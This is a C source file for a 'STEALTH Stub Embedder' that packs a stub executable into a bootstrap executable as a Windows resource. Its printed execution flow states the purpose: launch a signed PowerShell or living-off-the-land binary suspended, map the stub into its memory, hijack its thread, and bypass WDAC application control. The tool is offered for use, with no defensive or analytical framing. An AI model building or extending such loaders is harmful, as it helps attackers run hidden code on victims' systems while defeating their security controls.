/*
 * embed_stub.c - Embed packed stub as resource into bootstrap
 * 
 * Usage: embed_stub.exe bootstrap.exe packed_stub.exe output.exe
 * 
 * Compile: gcc -O2 -o embed_stub.exe embed_stub.c -lkernel32
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define RESOURCE_TYPE "STUBDATA"
#define RESOURCE_ID 101

static unsigned char* read_file(const char *path, DWORD *size) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        printf("[-] Failed to open: %s\n", path);
        return NULL;
    }
    
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (sz <= 0 || sz > 100*1024*1024) {
        printf("[-] Invalid file size: %ld bytes\n", sz);
        fclose(f);
        return NULL;
    }
    
    unsigned char *data = malloc(sz);
    if (!data) {
        printf("[-] Memory allocation failed\n");
        fclose(f);
        return NULL;
    }
    
    if (fread(data, 1, sz, f) != (size_t)sz) {
        printf("[-] Failed to read file\n");
        free(data);
        fclose(f);
        return NULL;
    }
    
    fclose(f);
    *size = (DWORD)sz;
    return data;
}

static DWORD get_file_size(const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    return size;
}

int main(int argc, char *argv[]) {
    printf("================================================================================\n");
    printf(" STEALTH Stub Embedder\n");
    printf("================================================================================\n\n");
    
    if (argc != 4) {
        printf("Usage: %s <bootstrap.exe> <packed_stub.exe> <output.exe>\n", argv[0]);
        return 1;
    }
    
    const char *bootstrap_path = argv[1];
    const char *stub_path = argv[2];
    const char *output_path = argv[3];
    
    // Validate inputs
    DWORD bootstrap_size = get_file_size(bootstrap_path);
    DWORD stub_size_check = get_file_size(stub_path);
    
    if (bootstrap_size == 0) {
        printf("[-] Bootstrap not found: %s\n", bootstrap_path);
        return 1;
    }
    if (stub_size_check == 0) {
        printf("[-] Stub not found: %s\n", stub_path);
        return 1;
    }
    
    printf("[+] Bootstrap: %s (%lu bytes, %.2f KB)\n", 
           bootstrap_path, bootstrap_size, bootstrap_size / 1024.0);
    printf("[+] Stub: %s (%lu bytes, %.2f MB)\n", 
           stub_path, stub_size_check, stub_size_check / 1024.0 / 1024.0);
    printf("\n");
    
    // Read stub
    printf("[*] Reading stub...\n");
    DWORD stub_size = 0;
    unsigned char *stub_data = read_file(stub_path, &stub_size);
    if (!stub_data) return 1;
    printf("[+] Loaded %lu bytes\n\n", stub_size);
    
    // Copy bootstrap to output
    printf("[*] Copying bootstrap to output...\n");
    if (!CopyFileA(bootstrap_path, output_path, FALSE)) {
        printf("[-] CopyFile failed: %lu\n", GetLastError());
        free(stub_data);
        return 1;
    }
    printf("[+] Copied to: %s\n\n", output_path);
    
    // Begin resource update
    printf("[*] Embedding stub as resource...\n");
    HANDLE hUpdate = BeginUpdateResourceA(output_path, FALSE);
    if (!hUpdate) {
        printf("[-] BeginUpdateResource failed: %lu\n", GetLastError());
        free(stub_data);
        return 1;
    }
    
    // Add stub as resource
    if (!UpdateResourceA(hUpdate, RESOURCE_TYPE, MAKEINTRESOURCEA(RESOURCE_ID),
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                        stub_data, stub_size)) {
        printf("[-] UpdateResource failed: %lu\n", GetLastError());
        EndUpdateResourceA(hUpdate, TRUE);
        free(stub_data);
        return 1;
    }
    
    printf("[+] Embedded %lu bytes as resource:\n", stub_size);
    printf("    - Type: %s\n", RESOURCE_TYPE);
    printf("    - ID: %d\n\n", RESOURCE_ID);
    
    // Commit changes
    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        printf("[-] EndUpdateResource failed: %lu\n", GetLastError());
        free(stub_data);
        return 1;
    }
    
    free(stub_data);
    
    // Verify output
    DWORD output_size = get_file_size(output_path);
    printf("[+] Success!\n");
    printf("[+] Output: %s\n", output_path);
    printf("[+] Total size: %lu bytes (%.2f MB)\n", output_size, output_size / 1024.0 / 1024.0);
    printf("[+] Overhead: %lu bytes (%.2f KB)\n", 
           output_size - stub_size - bootstrap_size,
           (output_size - stub_size - bootstrap_size) / 1024.0);
    
    printf("\n");
    printf("================================================================================\n");
    printf(" EXECUTION FLOW\n");
    printf("================================================================================\n");
    printf("1. User runs: %s\n", output_path);
    printf("2. Bootstrap extracts stub from resource ID %d\n", RESOURCE_ID);
    printf("3. Bootstrap launches signed PowerShell/LOLBIN suspended\n");
    printf("4. Bootstrap maps stub into signed process memory\n");
    printf("5. Bootstrap hijacks thread to stub entry point\n");
    printf("6. Stub executes → loads plugins from overlay → bypasses WDAC\n");
    printf("\n");
    
    return 0;
}
